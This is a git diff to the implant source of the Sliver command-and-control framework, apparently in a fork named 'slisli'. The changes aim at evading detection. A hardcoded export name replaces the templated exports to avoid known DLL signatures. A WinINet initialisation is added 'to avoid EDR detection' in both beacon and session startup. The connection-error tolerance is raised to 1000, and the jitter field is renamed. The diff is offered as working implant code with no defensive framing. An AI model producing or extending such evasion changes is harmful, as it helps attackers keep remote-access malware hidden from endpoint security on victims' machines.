@@ -41,15 +41,19 @@ import (
 	"log"
 	// {{end}}
 
-	consts "github.com/bishopfox/sliver/implant/sliver/constants"
-	"github.com/bishopfox/sliver/implant/sliver/handlers"
-	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
-	"github.com/bishopfox/sliver/implant/sliver/limits"
-	"github.com/bishopfox/sliver/implant/sliver/locale"
-	"github.com/bishopfox/sliver/implant/sliver/pivots"
-	"github.com/bishopfox/sliver/implant/sliver/transports"
-	"github.com/bishopfox/sliver/implant/sliver/version"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	consts "github.com/papcaii/slisli/implant/sliver/constants"
+	"github.com/papcaii/slisli/implant/sliver/handlers"
+	"github.com/papcaii/slisli/implant/sliver/hostuuid"
+	"github.com/papcaii/slisli/implant/sliver/limits"
+	"github.com/papcaii/slisli/implant/sliver/locale"
+	"github.com/papcaii/slisli/implant/sliver/pivots"
+	"github.com/papcaii/slisli/implant/sliver/transports"
+	"github.com/papcaii/slisli/implant/sliver/version"
+	"github.com/papcaii/slisli/protobuf/sliverpb"
+
+	// {{if eq .Config.GOOS "windows" }}
+	wininet "github.com/papcaii/slisli/implant/sliver/transports/httpclient/drivers/win/wininet"
+	// {{end}}
 
 	"github.com/gofrs/uuid"
 	"google.golang.org/protobuf/proto"
@@ -113,15 +117,14 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 // {{if or .Config.IsSharedLib .Config.IsShellcode}}
 var isRunning bool = false
 
-// {{range .Config.Exports}}
-//export {{.}}
-func {{.}} () {
+// We hardcode a single, custom export name to avoid common signatures like 'StartW' or 'DllRegisterServer'
+//export WorkerMain
+func WorkerMain() {
 	if !isRunning {
 		isRunning = true
 		main()
 	}
 }
-// {{end}}
 // {{end}}
 
 func main() {
@@ -160,6 +163,18 @@ func main() {
 
 // {{if .Config.IsBeacon}}
 func beaconStartup() {
+
+	// {{if eq .Config.GOOS "windows" }}
+	// Initialize WinINet using GetModuleHandle to avoid EDR detection
+	if err := wininet.Init(); err != nil {
+		// If this fails, beaconing will likely fail, but we don't want to crash.
+		// Log the error if debug mode is enabled.
+		// {{if .Config.Debug}}
+		log.Printf("[!] Failed to initialize WinINet: %v", err)
+		// {{end}}
+	}
+	// {{end}}
+
 	// {{if .Config.Debug}}
 	log.Printf("Running in Beacon mode with ID: %s", InstanceID)
 	// {{end}}
@@ -168,6 +183,7 @@ func beaconStartup() {
 		abort <- struct{}{}
 	}()
 	beacons := transports.StartBeaconLoop(abort)
+	const maxConnectionErrors = 1000
 	for beacon := range beacons {
 		// {{if .Config.Debug}}
 		log.Printf("Next beacon = %v", beacon)
@@ -176,7 +192,7 @@ func beaconStartup() {
 			err := beaconMainLoop(beacon)
 			if err != nil {
 				connectionErrors++
-				if transports.GetMaxConnectionErrors() < connectionErrors {
+				if connectionErrors > maxConnectionErrors {
 					return
 				}
 			}
@@ -192,6 +208,18 @@ func beaconStartup() {
 // {{else}}
 
 func sessionStartup() {
+
+	// {{if eq .Config.GOOS "windows" }}
+	// Initialize WinINet using GetModuleHandle to avoid EDR detection
+	if err := wininet.Init(); err != nil {
+		// If this fails, beaconing will likely fail, but we don't want to crash.
+		// Log the error if debug mode is enabled.
+		// {{if .Config.Debug}}
+		log.Printf("[!] Failed to initialize WinINet: %v", err)
+		// {{end}}
+	}
+	// {{end}}
+
 	// {{if .Config.Debug}}
 	log.Printf("Running in session mode")
 	// {{end}}
@@ -265,7 +293,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	beacon.Send(wrapEnvelope(sliverpb.MsgBeaconRegister, &sliverpb.BeaconRegister{
 		ID:          InstanceID,
 		Interval:    beacon.Interval(),
-		Jitter:      beacon.Jitter(),
+		TimeSkew:      beacon.TimeSkew(),
 		Register:    register,
 		NextCheckin: int64(beacon.Duration().Seconds()),
 	}))
